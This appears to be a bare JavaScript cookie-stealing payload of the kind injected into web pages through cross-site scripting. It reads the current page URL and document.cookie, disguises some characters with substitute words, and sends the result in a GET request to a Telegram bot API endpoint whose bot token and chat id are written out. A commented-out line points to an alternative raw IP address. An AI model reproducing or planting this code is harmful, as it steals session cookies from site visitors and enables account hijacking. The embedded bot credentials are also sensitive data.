url = window.location.href
    url = url.replace('http://','')
    url = url.replace(/\//g,'Fan')
    url = url.replace(/\:/g,'Mao')
    url = url.replace(/\?/g,'Wen')
    url = url.replace(/\=/g,'Query')
    url = url+'Cookie'+document.cookie
    xmlhttp=new XMLHttpRequest();
    bot= 'https://api.telegram.org/bot1261192804:AAEN08e2_gs4YwpEfBOQbEb__zgSsYDNGng/sendMessage?chat_id=819952462&text='+url
    // xmlhttp.open("GET","http://8.210.61.3:8000/369/"+url,true);
    xmlhttp.open("GET",bot,true);
    // xmlhttp.setRequestHeader("Access-Control-Allow-Origin","*");
    xmlhttp.send();
    console.log(url)
